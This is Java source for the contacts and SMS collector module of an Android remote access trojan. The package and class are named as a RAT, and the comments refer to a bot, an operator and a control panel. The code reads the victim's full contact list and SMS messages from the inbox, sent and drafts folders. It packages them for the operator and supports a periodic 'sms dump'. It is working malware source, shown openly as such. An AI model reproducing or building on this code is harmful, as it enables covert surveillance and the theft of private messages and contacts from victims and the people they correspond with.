package com.darkbiit.rat;

import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import android.provider.ContactsContract;
import android.provider.Telephony;

import java.util.ArrayList;
import java.util.LinkedHashMap;
import java.util.List;
import java.util.Map;

/**
 * Contacts and SMS collectors.
 *
 * Both need a runtime permission (READ_CONTACTS / READ_SMS). When it is not
 * granted the cursor is null and the collector returns an explicit
 * "denied" marker instead of throwing, so the panel can tell the operator
 * that the bot needs the permission rather than showing an empty list.
 */
public final class RatSms {

    private RatSms() {
    }

    /** Reads up to {@code limit} contacts. */
    public static Map<String, Object> contacts(Context ctx, int limit) {
        Map<String, Object> out = new LinkedHashMap<String, Object>();
        List<Object> list = new ArrayList<Object>();
        Cursor c = null;
        try {
            c = ctx.getContentResolver().query(
                    ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                    new String[] {
                            ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
                            ContactsContract.CommonDataKinds.Phone.NUMBER,
                            ContactsContract.CommonDataKinds.Phone.CONTACT_ID
                    },
                    null, null,
                    ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME + " ASC");

            if (c == null) {
                out.put("ok", false);
                out.put("error", "contacts unavailable (permission?)");
                return out;
            }
            int n = 0;
            while (c.moveToNext() && n++ < limit) {
                Map<String, Object> one = new LinkedHashMap<String, Object>();
                one.put("name", c.getString(0));
                one.put("number", c.getString(1));
                one.put("id", c.getString(2));
                list.add(one);
            }
            out.put("ok", true);
            out.put("count", list.size());
            out.put("contacts", list);
        } catch (Throwable t) {
            out.put("ok", false);
            out.put("error", t.getClass().getSimpleName() + ": " + String.valueOf(t.getMessage()));
        } finally {
            close(c);
        }
        return out;
    }

    /** Reads up to {@code limit} SMS messages (inbox + sent + drafts). */
    public static Map<String, Object> sms(Context ctx, int limit) {
        Map<String, Object> out = new LinkedHashMap<String, Object>();
        List<Object> list = new ArrayList<Object>();
        Cursor c = null;
        try {
            Uri uri = Telephony.Sms.CONTENT_URI;
            c = ctx.getContentResolver().query(uri,
                    new String[] {
                            "_id",
                            "address",
                            "body",
                            "date",
                            "type",
                            "read"
                    },
                    null, null, "date DESC");

            if (c == null) {
                out.put("ok", false);
                out.put("error", "sms unavailable (permission?)");
                return out;
            }
            int n = 0;
            while (c.moveToNext() && n++ < limit) {
                Map<String, Object> one = new LinkedHashMap<String, Object>();
                one.put("id", c.getString(0));
                one.put("address", c.getString(1));
                one.put("body", c.getString(2));
                one.put("date", c.getLong(3));
                one.put("type", c.getInt(4));
                one.put("read", c.getInt(5));
                list.add(one);
            }
            out.put("ok", true);
            out.put("count", list.size());
            out.put("messages", list);
        } catch (Throwable t) {
            out.put("ok", false);
            out.put("error", t.getClass().getSimpleName() + ": " + String.valueOf(t.getMessage()));
        } finally {
            close(c);
        }
        return out;
    }

    /** Returns the newest N SMS, used for a periodic "sms dump" event. */
    public static List<Object> lastSms(Context ctx, int limit) {
        Map<String, Object> m = sms(ctx, limit);
        Object v = m.get("messages");
        if (v instanceof List) {
            @SuppressWarnings("unchecked")
            List<Object> l = (List<Object>) v;
            return l;
        }
        return new ArrayList<Object>();
    }

    private static void close(Cursor c) {
        if (c != null) {
            try {
                c.close();
            } catch (Throwable ignored) {
                // nothing to do
            }
        }
    }
}
